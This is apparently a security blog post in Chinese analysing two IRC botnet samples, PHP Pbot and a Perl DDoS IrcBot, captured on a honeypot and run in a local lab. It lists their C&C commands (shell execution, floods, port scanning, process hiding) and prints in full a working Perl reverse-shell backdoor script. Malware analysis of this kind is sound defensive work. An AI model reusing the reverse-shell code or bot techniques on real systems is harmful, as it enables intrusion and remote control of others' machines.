---
title: 两款IRC Bot的分析
date: 2018-06-06 10:01:49
tags: [sec,IRC,BOT]
categories: Security
---

<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>


近期在蜜罐上捕获到两个利用RCE漏洞传播的远控木马，经过分析判断是基于IRC协议的bot样本，分别是使用php编写的`Pbot`和使用Perl版的`Perl IrcBot`，下面简单分析一下这两个脚本。

## 0x01 IRC协议简介

> IRC是Internet Relay Chat 的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为Channel（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。 

基础IRC指令如下表，更详细的可以参考[这里](https://github.com/sulit/docs/blob/master/src/irc/irc.md)

| 指令                 | 注释                                                         |
| -------------------- | ------------------------------------------------------------ |
| /join #<channel>     | 加入名为channel的频道。所有频道名均以'#'开头。               |
| /part #<channel>     | 离开名为channel的频道。                                      |
| /nick <NewNick>      | 将你当前的昵称改为NewNick。                                  |
| /me <action>         | 在当前频道显示某个动作（举个例子，/me waves会显示"*JohnSmith waves"。） |
| /away <Message>      | 将你的状态标记为"Away"（离开），并向任何给你发消息的人发送内容为Message的信息。 |
| /msg <nick><message> | 向名为nick的用户发送内容为message的私信。                    |
| /quit                | 终止IRC连接。                                                |

在这两个bot中用到的比较关键的是`PRIVMSG  `指令，指的是Private Message（私密消息），它的基本格式类似这样：

`:Nick!user@host PRIVMSG destination :Message `

黑客利用IRC协议与被控主机通信，C&C发送的指令就是这种格式，bot根据PRIVMSG后的Message进行相应操作，大致过程如下图所示

![](https://ob5vt1k7f.qnssl.com/Snipaste_20180605_111020.png)

### 环境准备

我们在本地Ubuntu系统搭建一个IRC服务器，用来模拟样本与C&C的通信。

1.搭建IRC服务器

`apt-get install inspircd`

修改配置文件`vim /etc/inspircd/inspircd.conf `

修改`bind address`监听在`0.0.0.0`

启动服务`service inspircd start `

2.使用mIRC软件模拟通信

在Windows下面可以使用mIRC软件进行irc通信，[下载地址](https://www.mirc.com/get.html) 

创建一个IRC Servers `irc.local`，地址为`192.168.3.195`，密码可以为空

连接上本地IRC服务器后我们创建一个channel，叫做`#php`

![1528252223926](https://ob5vt1k7f.qnssl.com/1528252223926.png)

这样就加入了`#php`channel



##  0x02 Pbot

Pbot是使用php编写的IrcBot

### 连接配置
我们修改bot的连接配置，其中`hostauth`是受信任的控制端，黑客会设置为自己的ip，我们将之设置为`*`
```php
$cfg = array(
    "server" => "192.168.3.195",	//irc服务器地址
    "port" => "6667",
    "key" => "",
    "prefix" => "",
    "maxrand" => "8",
    "chan" => "#php",				//加入的频道
    "trigger" => ".",				//指令分隔符
    "hostauth" => "*"				//受信任的远程主机，修改为*
);
```

然后可以增加一行语句来输出当前的connection状态，方便查看

`echo fgets($this->conn, 512);`

初始化阶段bot先设置好一些信息，例如服务器ip、端口等
```php
public function start($cfg)
{
    $this->config = $cfg;
    while (true) {
        if (!($this->conn = fsockopen($this->config['server'], $this->config['port'], $e, $s, 30)))
            $this->start($cfg);
        $ident = $this->config['prefix'];
        $alph = range("0", "9");
        for ($i = 0; $i < $this->config['maxrand']; $i++)
            $ident .= $alph[rand(0, 9)];
        $this->send("USER " . $ident . " 127.0.0.1 localhost :" . php_uname() . "");
        $this->set_nick();
        $this->main();
    }
}
```


随后bot会设置一个随机名称加入相应的channel

![1528252610192](https://ob5vt1k7f.qnssl.com/1528252610192.png)

在IRC聊天室也能看到bot上线

![1528252650212](https://ob5vt1k7f.qnssl.com/1528252650212.png)



### 功能分析

当连接建立后，bot会持续监听socket信息，然后根据C&C发送的指令进行响应

支持的指令有如下几种

**.user <password>** 用于登录bot，以便它接受其他命令。密码即为初始配置的密码，只有登录成功后才能进行后续指令下发操作

**.logout** 注销bot

**.die** 关闭与IRC服务器的连接

**.restart** 重启bot

**.mail <to> <from> <subject> <msg>**  发送邮件，调用php的`mail()`函数，可以用来发送垃圾邮件

**.dns <domain>**进行DNS查询

**.download <URL> <filename>** 下载文件

**.exec <command>** 使用`exec()`函数执行命令

**.cmd <command>** 使用`popen()`函数执行命令

**.info** 获取系统信息

**.php <php code>**  使用`eval()`函数执行php代码

**.tcpflood <target> <packets> <packetsize> <port> <delay>** TCP Flood攻击

**.udpflood <target> <packets> <packetsize> <delay>** UDP Flood洪水攻击

**.raw <cmd>** 原始IRC命令

**.rndnick** 更改bot昵称

**.pscan <host> <port>** 端口扫描

**.safe** 测试`safe_mode`是否开启

**.inbox <to>** 测试收件箱

**.conback <ip> <port>** 创建一个perl脚本并执行，可以反弹shell。



我们分析一下其中的几个指令

控制端在聊天室发送消息，指令需要以`.`开头，因为下面会根据分隔符`.`来取出实际命令

实际传输的指令是这样的格式

`:test!test@192.168.3.193 PRIVMSG #php :.command`

bot会根据PRIVMSG后面的`.command`进入相应的分支

#### uname

![1528254954215](https://ob5vt1k7f.qnssl.com/1528254954215.png)

![1528254899287](https://ob5vt1k7f.qnssl.com/1528254899287.png)

在进入对应指令的分支之前先判断当前连接的irc服务器是否在`hostauth`列表，这决定了bot是否接受控制

再一个就是以`.`来作为指令的起始符，这里应该取配置中的`trigger`变量，但是此处被硬编码为`.`

随后便进入`uname`分支调用`php_uname()`方法

#### exec&cmd

执行命令部分有两块可以实现，分别是exec和cmd

![1528255190724](https://ob5vt1k7f.qnssl.com/1528255190724.png)

其中exec直接调用php内置的exec命令，cmd则是通过自定义方法`Exe()`执行，在`Exe()`方法内部对系统支持的命令执行函数进行了判断，可以通过以下几种方法使命令得到最终执行

![1528255437456](https://ob5vt1k7f.qnssl.com/1528255437456.png)

#### pscan

可以探测指定ip的端口是否开放

`.pscan ip port`

![1528271275578](https://ob5vt1k7f.qnssl.com/1528271275578.png)

#### conback

`conback <ip> <port> `

![1528270109767](https://ob5vt1k7f.qnssl.com/1528270109767.png)

该指令会在尝试在`/tmp/`和`/var/tmp`写入脚本，脚本使用perl语言编写并经过base64编码，执行后会向指定ip反弹一个shell，在连接断开后脚本自动删除。脚本内容如下：

```perl
#!/usr/bin/perl
use Socket;
print "Data Cha0s Connect Back Backdoor\n\n";
if (!$ARGV[0]) {
  printf "Usage: $0 [Host] <Port>\n";
  exit(1);
}
print "[*] Dumping Arguments\n";
$host = $ARGV[0];
$port = 80;
if ($ARGV[1]) {
  $port = $ARGV[1];
}
print "[*] Connecting...\n";
$proto = getprotobyname('tcp') || die("Unknown Protocol\n");
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
my $target = inet_aton($host);
if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
  die("Unable to Connect\n");
}
print "[*] Spawning Shell\n";
if (!fork( )) {
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {'/bin/sh'} '-bash' . "\0" x 4;
  exit(0);
}
print "[*] Datached\n\n";
```

测试了几个功能都是可以正常使用的，如下图

![1528269072874](https://ob5vt1k7f.qnssl.com/1528269072874.png)

在数据包中也能清楚地看到交互过程

![1528270676034](https://ob5vt1k7f.qnssl.com/1528270676034.png)



## 0x03 DDoS Perl IrcBot

基于Perl编写的IrcBot功能大致与Pbot相同，不过实现方式有些不一样

![1528274109719](https://ob5vt1k7f.qnssl.com/1528274109719.png)

从bot的帮助信息来看是支持不少指令的，主要分为以下几个功能模块

```perl
!u @system 	# 系统模块
!u @version	# 版本信息
!u @channel	# IRC频道操作模块
!u @flood  	# DDoS模块
!u @utils  	# 其它功能模块
```

### 连接配置

```perl
$server = '192.168.3.195' unless $server;	# 服务器ip，如果$server不存在则默认
my $port = '6667';	# 端口

my $linas_max='8';
my $sleep='5';

my $homedir = "/tmp";	#工作目录
my $version = 'gztest v1'; 

my @admins = ("test","root","root1","root2","root3","root4"); # 管理员
my @hostauth = ("192.168.3.193"); 	# 管理员ip
my @channels = ("#Perl"); 	# IRC频道
```

同样的，我们在`192.168.3.195`IRC服务器上创建一个`#Perl`频道，运行后能看到bot上线

### 功能分析

#### 数据包

抓取数据包看一下IrcBot与IRC服务器之间的通信

![1528274862059](https://ob5vt1k7f.qnssl.com/1528274862059.png)

发送消息部分是和Pbot是一样的，Pbot是通过起始符(`.`)来提取具体指令，而在Perl IrcBot内部则是通过正则表达式来完成，即`parse`方法

![1528275278915](https://ob5vt1k7f.qnssl.com/1528275278915.png)

随后根据具体指令执行相应的功能

```perl
if (grep {$_ =~ /^\Q$hostmask\E$/i} @hostauth) {
    if (grep {$_ =~ /^\Q$pn\E$/i} @admins) {	# 判断当前ip和用户是否是管理员
        if ($onde eq "$meunick") {
            shell("$pn", "$args");
        }
        if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {			# 三种方法来执行功能
                ircase("$pn", "$onde", "$1");
            }
            elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep", "$1");			# help/irc/ddos/shell等功能
            }
            else {
                shell("$onde", "$arg");
            }
        }
    }
}
```

`bfunc`方法作为最主要的模块，包含了4部分功能

- **帮助信息**  显示脚本帮助信息；
- **IRC频道操作**  包括加入退出频道，更改昵称，邀请朋友等；
- **DDoS模块**  包括TCP Flood、UDP Flood、HTTP DDoS等功能；
- **渗透辅助功能**   包括执行命令、反弹shell、端口扫描、文件下载等功能；

其中`ircase`是相应的在IRC频道中的操作

![1528276673338](https://ob5vt1k7f.qnssl.com/1528276673338.png)

用图形来表示bot的主要功能如下图所示

![1528281340573](https://ob5vt1k7f.qnssl.com/1528281340573.png)



#### 行为特征

![1528277061564](https://ob5vt1k7f.qnssl.com/1528277061564.png)

在bot启动的时候，不会以自身的进程启动，而是在`sshd`，`apache`等进程中随机fork一个启动，fork失败则退出脚本，这样子非常隐蔽地隐藏了自身进程，随后在加入IRC服务器的过程中也会随机选择一个IRC版本号加入。

在运行Perl IrcBot后，脚本选择以`/usr/sbin/cron`的进程启动，而且可以明显看到CPU占用达到100%，脚本潜伏在正常进程中很难被发现。

![1528274476743](https://ob5vt1k7f.qnssl.com/1528274476743.png)



## 0x04 总结

这两款IRC bot在互联网上已经存在很久了，最近被广泛利用的Drupal RCE漏洞和Weblogic XMLDecoder反序列化漏洞使此类基于IRC协议的恶意脚本重新流行起来，根据在线文件分享平台[pastebin](https://pastebin.com/search?q=ircbot)查询相关脚本也不在少数，而且存在多种语言版本的IRC bot，黑客直接通过各种远程漏洞植入样本，接受C&C控制，具有很大的危害性。
